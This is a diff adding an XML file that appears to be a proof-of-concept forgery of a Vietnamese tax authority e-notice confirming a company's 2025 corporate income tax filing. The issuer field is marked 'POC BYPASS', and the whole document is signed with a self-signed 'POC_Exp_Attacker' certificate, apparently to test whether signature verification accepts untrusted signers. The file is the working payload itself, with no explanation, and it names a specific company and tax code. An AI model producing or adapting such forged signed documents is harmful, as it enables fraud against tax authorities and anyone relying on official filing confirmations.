@@ -1,0 +1,102 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<TBaoThueDTu xmlns="http://kekhaithue.gdt.gov.vn/TBaoThue" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+    <TBaoThue Id="_NODE_TO_SIGN">
+        <TTinChung>
+            <CQT>
+                <maCQT>10107</maCQT>
+                <tenCQT>CQT GIA LAM - POC BYPASS</tenCQT>
+                <DVu>
+                    <maDVu>088</maDVu>
+                    <tenDVu>Dịch vụ công Cục thuế</tenDVu>
+                    <pbanDVu>1.0.0</pbanDVu>
+                </DVu>
+            </CQT>
+            <NNhanTBaoThue>
+                <maNNhan>0110853152</maNNhan>
+                <tenNNhan>CÔNG TY TNHH KÍNH MẮT PARIS</tenNNhan>
+                <diaChiNNhan xsi:nil="true"/>
+            </NNhanTBaoThue>
+            <TTinTBaoThue>
+                <maTBao>844</maTBao>
+                <tenTBao>V/v: Xác nhận nộp hồ sơ thuế điện tử TT19</tenTBao>
+                <pbanTBao>2.4.9</pbanTBao>
+                <soTBao>30759/0108/2026/TB-TĐT</soTBao>
+                <ngayTBao>2026-03-13</ngayTBao>
+            </TTinTBaoThue>
+        </TTinChung>
+        <NDungTBao>
+            <trangThai>Y</trangThai>
+            <ngayNopThucTe>2026-03-12T21:44:38.003+07:00</ngayNopThucTe>
+            <HoSoThue>
+                <CTietHoSoThue id="1">
+                    <tokhai-phuluc>Tờ khai quyết toán thuế TNDN mẫu số 03/TNDN (TT80/2021)</tokhai-phuluc>
+                    <loaiToKhai>Chính thức</loaiToKhai>
+                    <kyTinhThue>2025</kyTinhThue>
+                    <lanNop>1</lanNop>
+                </CTietHoSoThue>
+            </HoSoThue>
+            <IDKhoanNop/>
+            <maGiaoDichDTu>10820260011024204</maGiaoDichDTu>
+            <ngayChapNhan>2026-03-12T21:44:38.003+07:00</ngayChapNhan>
+            <ngayHoanThanh>2026-03-13T10:20:14.000+07:00</ngayHoanThanh>
+            <thoiGianHenTra xsi:nil="true"/>
+            <LyDo/>
+            <duongDan>https://dichvucong.gdt.gov.vn</duongDan>
+            <hotline>(08) 38917432</hotline>
+            <email xsi:nil="true"/>
+        </NDungTBao>
+    </TBaoThue>
+    <CKyDTu>
+        <Signature xmlns="http://www.w3.org/2000/09/xmldsig#" Id="Tct-214a393ca7c64735896b14aedc96cca4">
+            <SignedInfo>
+                <CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
+                <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
+                <Reference URI="#_NODE_TO_SIGN">
+                    <Transforms>
+                        <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
+                    </Transforms>
+                    <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
+                    <DigestValue>Cdb+KfDJVWwf/VN4aQaTR8CHAk86Hw0tJ2whY3MsshI=</DigestValue>
+                </Reference>
+                <Reference URI="#SigningTime-f9cff2e98fd343aebdf0bffd27d5923a">
+                    <Transforms>
+                        <Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
+                    </Transforms>
+                    <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
+                    <DigestValue>oUFwNjIv1ckx5YtUpooHp3n+dj/c5sJboXFTCAPD854=</DigestValue>
+                </Reference>
+            </SignedInfo>
+            <SignatureValue>bcxR6QoRX+IDtzzOhGPqkSE4eB2KWyp/FUW0ozaTeQbx74L9XixBFtjPtZ8gTU/CE/xxLIoI8Yo5&#13;
+P+DsSgTt22og//oEMe8NaOVwsEXb6pHbKIahP6FH+uDgWKOntXoS4m/OAUHOuomJTBFaN/RdLG6k&#13;
+LBOjSNLdVd0m4XOhUNan5pZSjKDR/is+ue2zKBnYK5JaQKQcp6Sk17lkfDDdEMP4gqeHSnlfNRDu&#13;
+6beRqabHXbbfLn8XJTowgD7rQgF3DouBoChUmn3EJZfYdNEBK/TXHJIkUjcHfwd818iuTNZhg8kr&#13;
+ODFxM/rHjQ4IBUD9/AWCa1GE+8tE4l9JxWC7Eg==</SignatureValue>
+            <KeyInfo>
+                <X509Data>
+                    <X509SubjectName>CN=POC_Exp_Attacker,O=Attacker,C=VN</X509SubjectName>
+                    <X509Certificate>MIIDFTCCAf2gAwIBAgIEOaflDDANBgkqhkiG9w0BAQsFADA7MQswCQYDVQQGEwJWTjERMA8GA1UE&#13;
+ChMIQXR0YWNrZXIxGTAXBgNVBAMMEFBPQ19FeHBfQXR0YWNrZXIwHhcNMjYwNjIwMjM1MjMyWhcN&#13;
+MjcwNjIwMjM1MjMyWjA7MQswCQYDVQQGEwJWTjERMA8GA1UEChMIQXR0YWNrZXIxGTAXBgNVBAMM&#13;
+EFBPQ19FeHBfQXR0YWNrZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDStWXqGD92&#13;
+WfOOB/NPnCst2/MigJVOlD+S8/Lcifg3vvzkvaplSMZK5ZNsaQntf4Z3vRgX2kyWoL5JFwdXnj2H&#13;
+6L6YR95cFAYFg30cOg9SRv5RpqTX1aG+Sl5MKm6d1XhHugs6/QJQ/XHYFnM+7siQiOg7cqDiEIn6&#13;
+7zYknBb1ZS7Imemf9RbosuMnlornzBZvC5vnRzFmYdbWL506jdTSflHTKEMU+n/UnEwVlTve6ixf&#13;
+OHO3TcbSQ88mtGglJ3hwbiANDM5T5xnkH4vgh7hP386eSi7Adj7RctB/i8Hcwr5IulzZpXEuuWRG&#13;
+By16fwO7UGlqU0NEySM/bjJSL5QbAgMBAAGjITAfMB0GA1UdDgQWBBQcRfT3qG/Q+8UPZ/Hr1AJG&#13;
+kit78TANBgkqhkiG9w0BAQsFAAOCAQEACO88oT3gtL0CBeTMU5g/1W2hQAsidDSb+RRXWtCjbIWG&#13;
+a6Sy/FwWolhkj0XBybWDOoSckPgrWqRNk+AAcwpVdQ+iUwhTLTvz5YroT3+1L8fEe1dpHvxQygiq&#13;
+ksh0GCUwt7NQVDgAKyOBZoyJspvCZVOUEGTXrtcTMWPcf/tKHgV9mKcfua7TK6iJSu9Fns4TQ+bz&#13;
+3nq3Zt3+pkHkrO+J0KW/AxQ4+wxxGD/WfE3TaiZ4vPOCzEYKUMhpN2oMdzWLt/z1o+zQ5g9RHOI4&#13;
+/YjOl45GOPRLJDV8cNQfbQAeNjpHhVY/H1Q6Uff/PYvP8CwCpvTSRIFugta+wTXSoGPtIQ==</X509Certificate>
+                </X509Data>
+            </KeyInfo>
+            <Object Id="SigningTime-f9cff2e98fd343aebdf0bffd27d5923a">
+                <SignatureProperties>
+                    <SignatureProperty Target="#signedtaxreturn0">
+                        <DateTimeStamp>21062026183733</DateTimeStamp>
+                    </SignatureProperty>
+                </SignatureProperties>
+            </Object>
+        </Signature>
+    </CKyDTu>
+</TBaoThueDTu>
